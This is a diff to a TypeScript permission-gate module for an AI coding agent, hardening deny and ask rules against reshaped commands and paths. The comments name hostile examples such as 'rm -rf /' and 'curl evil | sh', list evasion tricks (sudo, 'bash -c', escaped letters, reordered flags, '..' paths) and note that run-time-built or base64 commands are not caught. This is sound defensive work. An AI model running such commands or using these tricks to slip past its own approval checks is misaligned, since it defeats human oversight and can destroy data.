@@ -131,25 +131,111 @@ function cmdMatches(pattern: string, sub: string): boolean {
   return commandVariants(sub).some((v) => re.test(v));
 }
 
+/** Programs that run the rest of the line as the command: `sudo rm …` is an rm. Their own options (`-u root`, `X=1`) are skipped. */
+const WRAPPERS = new Set(['sudo', 'doas', 'command', 'builtin', 'exec', 'env', 'nice', 'nohup', 'time', 'xargs']);
+const WRAPPER_OPTS_WITH_ARG = new Set(['-u', '-g', '-p', '-h', '-n']);
+/** Shells that run a command line given after their command flag (`bash -c "…"`, `cmd /c …`, `powershell -Command …`). */
+const SHELLS = new Set(['bash', 'sh', 'zsh', 'dash', 'ksh', 'fish', 'cmd', 'powershell', 'pwsh']);
+const SHELL_COMMAND_FLAGS = new Set(['-c', '/c', '/k', '-command']);
+/** Long flags with a one-letter twin, so `--recursive --force` reads as `-rf`. */
+const LONG_FLAGS: Record<string, string> = { '--recursive': 'r', '--force': 'f' };
+
+/** `/bin/rm`, `C:\Tools\rm.exe` and `rm` are the same program. */
+const programOf = (w: string): string => w.replace(/^.*[\\/]/, '').replace(/\.exe$/, '');
+
 /**
- * A rule's `commands` against a split command. DENY/ASK verbs fire when ANY subcommand matches (a deny must not
- * be evaded by chaining `safe-cmd && rm -rf /`); ALLOW only holds when EVERY subcommand matches (an allow for
- * `git *` must not approve `git push && curl evil | sh`) — Claude Code's own rule.
+ * One spelling for a command's leading options: short flags merged and sorted (`-r -f`, `-fr`, `-Rf` and `--recursive
+ * --force` are all `-fr`), `--` dropped. Words after the first non-option word are kept as they are.
+ */
+function canonicalWords(words: readonly string[]): string[] {
+  if (!words.length) return [];
+  const letters = new Set<string>();
+  const other: string[] = [];
+  let i = 1;
+  for (; i < words.length; i++) {
+    const w = words[i]!;
+    if (w === '--') { i++; break; }
+    if (LONG_FLAGS[w]) letters.add(LONG_FLAGS[w]!);
+    else if (/^-[a-z]+$/.test(w)) for (const ch of w.slice(1)) letters.add(ch);
+    else if (w.startsWith('-') && w.length > 1) other.push(w);
+    else break;
+  }
+  return [programOf(words[0]!), ...(letters.size ? [`-${[...letters].sort().join('')}`] : []), ...other, ...words.slice(i)];
+}
+
+/**
+ * Every form a DENY or ASK rule also matches a subcommand under, so a reshaped command cannot sidestep it: escapes
+ * removed (`r^m`, `r\m`), wrappers dropped (`sudo`, `env X=1`, `command`), the program's folder dropped (`/bin/rm`),
+ * options in one spelling (`rm -r -f` is `rm -fr`), and the command line inside `bash -c` / `cmd /c` / `powershell
+ * -Command` judged as subcommands of its own. Never used for ALLOW: each form only makes a rule match MORE commands,
+ * which tightens a deny but would loosen an allow.
+ *
+ * Known limit, stated rather than hidden: a command that builds its text at run time (a variable, base64, a script it
+ * wrote first) is not seen. Deny rules refine the approval question; they are not a sandbox.
+ */
+function denyForms(sub: string, depth = 0): string[] {
+  const out = new Set<string>();
+  for (const v of commandVariants(sub)) {
+    out.add(v);
+    let words = v.replace(/\^/g, '').replace(/\\(?=[a-z])/g, '').split(' ').filter(Boolean);
+    while (words.length && WRAPPERS.has(programOf(words[0]!))) {
+      words = words.slice(1);
+      while (words.length && (words[0]!.startsWith('-') || /^[a-z_][a-z0-9_]*=/.test(words[0]!))) {
+        const opt = words.shift()!;
+        if (WRAPPER_OPTS_WITH_ARG.has(opt) && words.length) words.shift();
+      }
+    }
+    if (!words.length) continue;
+    const prog = programOf(words[0]!);
+    const flag = words.findIndex((w, j) => j > 0 && SHELL_COMMAND_FLAGS.has(w));
+    if (SHELLS.has(prog) && flag > 0 && depth < 2) {
+      for (const inner of splitCommand(words.slice(flag + 1).join(' '))) for (const f of denyForms(inner, depth + 1)) out.add(f);
+    }
+    out.add(canonicalWords(words).join(' '));
+  }
+  return [...out];
+}
+
+/** A pattern in the same forms: `rm -rf *` is also `rm -fr *`, so it meets a command in its one spelling. */
+function patternForms(pattern: string): string[] {
+  const p = pattern.trim().toLowerCase().replace(/\s+/g, ' ');
+  const c = canonicalWords(p.split(' ')).join(' ');
+  return c === p ? [p] : [p, c];
+}
+
+/**
+ * A rule's `commands` against a split command. DENY/ASK verbs fire when ANY subcommand matches in ANY of its forms
+ * (a deny must not be evaded by chaining `safe-cmd && rm -rf /`, or by `sudo`, `bash -c` or `rm -r -f`); ALLOW only
+ * holds when EVERY subcommand matches as written (an allow for `git *` must not approve `git push && curl evil | sh`,
+ * and an allow for `rm -rf build` must not approve `sudo rm -rf build`) — Claude Code's own rule.
  */
 function commandsMatch(patterns: readonly string[], subs: readonly string[], then: GateVerdict): boolean {
   if (then === 'allow') return subs.length > 0 && subs.every((s) => patterns.some((p) => cmdMatches(p, s)));
-  return subs.some((s) => patterns.some((p) => cmdMatches(p, s)));
+  const res = patterns.flatMap(patternForms).map((p) => globRe(p));
+  return subs.some((s) => denyForms(s).some((f) => res.some((re) => re.test(f))));
 }
 
 /** Forward slashes, no duplicate separators. Pure: gates.ts must stay importable in the browser bundle. */
 const normPath = (p: string): string => p.replace(/\\/g, '/').replace(/\/{2,}/g, '/');
 
+/** Drop `.` segments and fold `..` into its parent, never above the root: `a/x/../b` is `a/b`, `/../etc` is `/etc`. */
+function collapseDots(p: string): string {
+  const root = /^(?:[a-zA-Z]:)?\//.exec(p)?.[0] ?? '';
+  const out: string[] = [];
+  for (const seg of p.slice(root.length).split('/')) {
+    if (seg === '' || seg === '.') continue;
+    if (seg === '..') { if (out.length && out[out.length - 1] !== '..') out.pop(); else if (!root) out.push('..'); continue; }
+    out.push(seg);
+  }
+  return root + out.join('/');
+}
+
 /** Make a path absolute against cwd (string-only: no fs, no path module — the UI bundle imports this file). */
 function absolute(path: string, cwd: string): string {
   const p = normPath(path);
-  if (/^[a-zA-Z]:\//.test(p) || p.startsWith('/')) return p;
+  if (/^[a-zA-Z]:\//.test(p) || p.startsWith('/')) return collapseDots(p);
   const c = normPath(cwd || '');
-  return c ? `${c.replace(/\/+$/, '')}/${p}` : p;
+  return collapseDots(c ? `${c.replace(/\/+$/, '')}/${p}` : p);
 }
 
 /** Gitignore-style glob: a double star (with or without a following slash) crosses directories; a single star and ? do not. */
@@ -169,34 +255,43 @@ function pathGlobRe(glob: string): RegExp {
 }
 
 /** A candidate matches a pattern when the pattern matches the whole path or a tail of it (gitignore's "any level"). */
-function pathMatches(pattern: string, candidate: string, cwd: string): boolean {
+function pathMatches(pattern: string, candidate: string, cwd: string, widen = false): boolean {
   const pat = normPath(pattern.trim());
   if (!pat) return false;
   const abs = absolute(candidate, cwd);
   if (pat.startsWith('/')) return pathGlobRe(pat).test(abs);
   const c = normPath(cwd || '');
   const rel = c && abs.startsWith(c + '/') ? abs.slice(c.length + 1) : abs;
-  return pathGlobRe(pat).test(abs) || pathGlobRe(pat).test(rel)
+  // For deny and ask, also the path without its root (`/` or `C:/`): a `**/` or bare-name pattern never matches a
+  // leading `/`, so without this a POSIX path (`/proj/src/secrets.txt`) would slip past `secrets.txt`. Never for allow:
+  // a form that matches more would widen an allow.
+  const forms = widen ? [abs, rel, abs.replace(/^(?:[a-zA-Z]:)?\//, '')] : [abs, rel];
+  return forms.some((f) => pathGlobRe(pat).test(f))
     // A bare name (no slash) matches at any level, like gitignore: `secrets.txt` hits src/secrets.txt too.
-    || (!pat.includes('/') && pathGlobRe(`**/${pat}`).test(abs));
+    || (!pat.includes('/') && forms.some((f) => pathGlobRe(`**/${pat}`).test(f)));
 }
 
 /**
  * Paths against a rule's list. A `!` entry carves candidates out of the entries BEFORE it (Claude Code's rule,
  * including "`!` first carves nothing"); `exceptPaths` carves out of the whole list. The rule matches when at
  * least one candidate survives.
+ *
+ * The wider path form (see pathMatches) is used only where it tightens: on a deny or ask rule's own patterns, and on
+ * an allow rule's carve-outs. A deny's carve-outs and an allow's patterns keep the exact form, so they never widen.
  */
-function pathsMatch(when: GateWhen, candidates: readonly string[], cwd: string): boolean {
+function pathsMatch(when: GateWhen, candidates: readonly string[], cwd: string, then: GateVerdict): boolean {
   const patterns = when.paths ?? [];
   if (!patterns.length) return true;
   if (!candidates.length) return false;
-  const carved = (p: string): boolean => (when.exceptPaths ?? []).some((e) => pathMatches(e, p, cwd));
+  const widenIn = then !== 'allow';
+  const widenOut = then === 'allow';
+  const carved = (p: string): boolean => (when.exceptPaths ?? []).some((e) => pathMatches(e, p, cwd, widenOut));
   return candidates.some((c) => {
     if (carved(c)) return false;
     let inList = false;
     for (const pat of patterns) {
-      if (pat.startsWith('!')) { if (pathMatches(pat.slice(1), c, cwd)) inList = false; continue; }
-      if (pathMatches(pat, c, cwd)) inList = true;
+      if (pat.startsWith('!')) { if (pathMatches(pat.slice(1), c, cwd, widenOut)) inList = false; continue; }
+      if (pathMatches(pat, c, cwd, widenIn)) inList = true;
     }
     return inList;
   });
@@ -256,7 +351,7 @@ export function decideGate(input: GateCall, rules: readonly GateRule[], mode: Ap
     // Command scoping is class-aware (any-subcommand for deny/ask, every-subcommand for allow); paths are the
     // same for every class. Both live here, not in whenMatches, because they need the rule's class.
     if (r.when.commands?.length && (!subs || !commandsMatch(r.when.commands, subs, r.then))) continue;
-    if ((r.when.paths?.length || r.when.exceptPaths?.length) && !pathsMatch(r.when, candidates, input.cwd ?? '')) continue;
+    if ((r.when.paths?.length || r.when.exceptPaths?.length) && !pathsMatch(r.when, candidates, input.cwd ?? '', r.then)) continue;
     matched.push(r);
   }
   const ruleIds = matched.map((r) => r.id);
